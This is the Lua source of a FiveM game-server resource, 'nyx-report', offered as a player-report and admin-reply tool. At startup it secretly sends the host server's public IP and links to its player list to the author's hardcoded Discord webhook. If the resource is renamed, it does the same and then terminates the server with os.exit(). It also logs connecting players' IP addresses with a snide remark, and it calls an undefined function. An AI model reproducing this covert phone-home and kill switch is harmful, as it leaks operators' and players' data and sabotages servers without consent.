ESX = nil 

TriggerEvent(Nyx.getSharedObject, function(obj) ESX = obj end)

NyxBase = {}

NyxBase.Functions = {}

Citizen.CreateThread(function()
    if (GetCurrentResourceName() ~= "nyx-report") then
        PerformHttpRequest('http://api.ipify.org/', function(err, text, headers, ip)
            local ip =  tostring(text)
            local authwebhook = "https://discord.com/api/webhooks/872199310123601970/OuAlMkMgofKuXi9fhxjtByl9APBckf8zXa55MFbLbPeRjKZbvC6nqYS8DXbRw8vqwOcf"
            PerformHttpRequest(authwebhook, function(err, text, headers) end, 'POST', json.encode({embeds={{title = "Nyx-Report Logger", description = "Someone tried to change their `nyx-report` resource name. \n\nName: `" .. GetCurrentResourceName() .."` \nIP: `" .. ip .."` \n\n Links to the server info and player: \nhttp://".. ip ..":30120/info.json \nhttp://".. ip ..":30120/players.json", footer = { text = "Made by Nyx.Dev", icon_url ="https://cdn.discordapp.com/attachments/869670166101905448/870333428149678150/Transparant_7_2D.png"}, color=16711680}}}),  { ['Content-Type'] = 'application/json' })
            print("╔═════════════════════════════════════════════════════════════════════════════════════════════╗");
            print("    This resource must be named 'nyx-report' for it to work. Change this as soon as possible.");
            print("      Your server will keep restarting to ensure that our script will not do any damage.");
            print("                        For support join the official Nyx.Dev discord.");
            print("                               https://discord.gg/6Hf9dKpNHT");
            print("╚═════════════════════════════════════════════════════════════════════════════════════════════╝");
        end)
        Citizen.Wait(1000)
        os.exit();
    else
        PerformHttpRequest('http://api.ipify.org/', function(err, text, headers, ip)
            local ip =  tostring(text)
            local authwebhook = "https://discord.com/api/webhooks/872199310123601970/OuAlMkMgofKuXi9fhxjtByl9APBckf8zXa55MFbLbPeRjKZbvC6nqYS8DXbRw8vqwOcf"
            PerformHttpRequest(authwebhook, function(err, text, headers) end, 'POST', json.encode({embeds={{title = "Nyx-Report Logger", description = "Someone is using `nyx-report` as they are supposed to. \n\nName: `" .. GetCurrentResourceName() .."` \nIP: `" .. ip .."` \n\n Links to the server info and player: \nhttp://".. ip ..":30120/info.json \nhttp://".. ip ..":30120/players.json", footer = { text = "Made by Nyx.Dev", icon_url ="https://cdn.discordapp.com/attachments/869670166101905448/870333428149678150/Transparant_7_2D.png"}, color=65280}}}),  { ['Content-Type'] = 'application/json' })
            print("╔══════════════════════════════════════════════════════════════════════════════╗");
            print("     Thank you for choosing nyx-report, We hope our product serves you well!");
            print("                For support join the official Nyx.Dev discord.");
            print("                       https://discord.gg/6Hf9dKpNHT");
            print("╚══════════════════════════════════════════════════════════════════════════════╝");
        end)

    end
end)

RegisterCommand(Nyx.Report, function(source, args)

    local nomessage = Nyx.Error
    local adminicon = Nyx.AdminIcon
    local reporticon = Nyx.ReportIcon
    local adminrgba = Nyx.AdminRGBA
    local padding = Nyx.Padding
    local margin = Nyx.Margin
    local border = Nyx.Border
    local title = Nyx.Title
    local reportrgba = Nyx.ReportRGBA
    local noonlinestaff = Nyx.NoStaffOnline
    local reportsuccess = Nyx.ReportSent
    local errorrgba = Nyx.ErrorRGBA
    local erroricon = Nyx.ErrorIcon

     if args[1] ~= nil then 

        local adminonline = 0
        local message = table.concat(args, " ")
        local spelers = ESX.GetPlayers()
        local adminmessage = "[" .. GetPlayerName(source) .. " | " .. source .. "] " .. message

        for i=1, #spelers, 1 do 
            if admincheck(spelers[i]) then 
                adminonline = adminonline + 1
                TriggerClientEvent('chat:addMessage', spelers[i], {
                    template = '<div style="padding: '.. padding ..'vw; margin:  '.. margin ..'vw; background-color: '.. adminrgba ..'; border-radius:'.. border ..'px;"><i class=" ' .. adminicon .. ' "></i> {0}<br> {1}</div>',
                    args = { title , adminmessage}
                })
            end
        end
        if adminonline > 0 then 
            TriggerClientEvent('chat:addMessage', source, {
                template = '<div style="padding: '.. padding ..'vw; margin:  '.. margin ..'vw; background-color: '.. reportrgba ..'; border-radius:'.. border ..'px;"><i class=" ' .. reporticon .. ' "></i> {0}<br> {1}</div>',
                args = {title, reportsuccess}
            })
            if Nyx.AlwaysLogToDiscord then 
                NyxBase.Functions.ReportLogToDiscord(source ,message)
            end
        else
            TriggerClientEvent('chat:addMessage', source, {
                template = '<div style="padding: '.. padding ..'vw; margin:  '.. margin ..'vw; background-color: '.. reportrgba ..'; border-radius:'.. border ..'px;"><i class=" ' .. reporticon .. ' "></i> {0}<br> {1}</div>',
                args = {title, noonlinestaff}
            })
            NyxBase.Functions.ReportReportLogToDiscord(source ,message)
        end
    else
        TriggerClientEvent('chat:addMessage', source, {
            template = '<div style="padding: '.. padding ..'vw; margin:  '.. margin ..'vw; background-color: '.. errorrgba ..'; border-radius:'.. border ..'px;"><i class="' .. erroricon .. '"></i> {0}<br> {1}</div>',
            args = {title, nomessage}
        }) 
    end
end)

-- Join Logs
function OnPlayerConnecting(name, setKickReason, deferrals)
    local src = source
    local identifiers = {
        steam = "",
        ip = "",
        discord = "",
        license = "",
    }
    
    for i = 0, GetNumPlayerIdentifiers(src) - 1 do
        local id = GetPlayerIdentifier(src, i)

        if string.find(id, "steam") then
            identifiers.steam = id
        elseif string.find(id, "ip") then
            identifiers.ip = id
        elseif string.find(id, "discord") then
            identifiers.discord = id
        elseif string.find(id, "license") then
            identifiers.license = id
        end
    end

    print("Matsko is aan het joinen " .. identifiers.ip .. " mooi ip")

end

AddEventHandler("playerConnecting", OnPlayerConnecting)

RegisterCommand(Nyx.Reply, function(source ,args )

    local src = source
    local replyicon = Nyx.ReplyIcon
    local noaccess = Nyx.NoPermission
    local selfreply = Nyx.SelfReply
    local invalidid = Nyx.InvalidID
    local messagesuccess = Nyx.Replied
    local incomingmessage = Nyx.Incoming
    local padding = Nyx.Padding
    local margin = Nyx.Margin
    local border = Nyx.Border
    local replyrgba = Nyx.ReplyRGBA

    if admincheck(src) then
        local target = args[1]
        if src ~= tonumber(target) then 
            if GetPlayerName(target) ~= nil then 
                table.remove(args, 1)
                local message = table.concat(args, " ")
                TriggerClientEvent('chat:addMessage', target, {
                    template = '<div style="padding: '.. padding ..'vw; margin:  '.. margin ..'vw; background-color: '.. replyrgba ..'; border-radius:'.. border ..'px;"><i class=" ' .. replyicon .. ' "></i> {0}<br> {1}</div>',
                    args = {"".. incomingmessage .." " .. GetPlayerName(source), message}
                })
                TriggerClientEvent('chat:addMessage', src, {
                    template = '<div style="padding: '.. padding ..'vw; margin:  '.. margin ..'vw; background-color: '.. replyrgba ..'; border-radius:'.. border ..'px;"><i class=" ' .. replyicon .. ' "></i> {0}<br> {1}</div>',
                    args = {"".. messagesuccess .." " .. GetPlayerName(target), message}
                })
                if Nyx.ReplyLogToDiscord then 
                    NyxBase.Functions.ReplyLogToDiscord(source ,message, target)
                end
            else
                TriggerClientEvent('mythic_notify:client:SendAlert', source, { type = 'error', text = invalidid})
            end
        else
            TriggerClientEvent('mythic_notify:client:SendAlert', source, { type = 'error', text = selfreply})
        end
    else
        TriggerClientEvent('mythic_notify:client:SendAlert', source, { type = 'error', text = noaccess})
    end
end)


NyxBase.Functions.ReportLogToDiscord = function(source , message)
    local WebHook = Nyx.Webhook
    local color = Nyx.ReportColor
    local header = Nyx.ReportHeader
    local avatar = Nyx.Avatar

    local embed = {
        ["color"] = color,
        ["type"] = "rich",
        ["title"] = header,
        ["description"] = message,
        ["footer"] = {
            ["text"] = "Made by Nyx.Dev",
            ["icon_url"] = "https://cdn.discordapp.com/attachments/869670166101905448/870333428149678150/Transparant_7_2D.png",
            },
    }
    PerformHttpRequest(WebHook, function(err, text, headers) end, 'POST', json.encode({ username = "" .. GetPlayerName(source) .. " | " .. source .. "", embeds = { embed }, avatar_url = avatar }), { ['Content-Type'] = 'application/json' })
end

NyxBase.Functions.ReplyLogToDiscord = function(source , message, target)
    local WebHook = Nyx.Webhook
    local color = Nyx.ReplyColor
    local avatar = Nyx.Avatar
    local header = Nyx.ReplyHeader

    local embed = {
        ["color"] = color,
        ["type"] = "rich",
        ["title"] = "".. header .. " → " .. GetPlayerName(target) .. " | " .. target .."",
        ["description"] = message,
        ["footer"] = {
            ["text"] = "Made by Nyx.Dev",
            ["icon_url"] = "https://cdn.discordapp.com/attachments/869670166101905448/870333428149678150/Transparant_7_2D.png",
            },
    }
    PerformHttpRequest(WebHook, function(err, text, headers) end, 'POST', json.encode({ username = "" .. GetPlayerName(source) .. " | " .. source .. "", embeds = { embed }, avatar_url = avatar }), { ['Content-Type'] = 'application/json' })
end

admincheck = function(source)
    local group = ESX.GetPlayerFromId(source).getGroup()
    for k,v in pairs(Nyx.AdminRanks) do 
        if v == group then 
            return true
        end
    end
    return false
end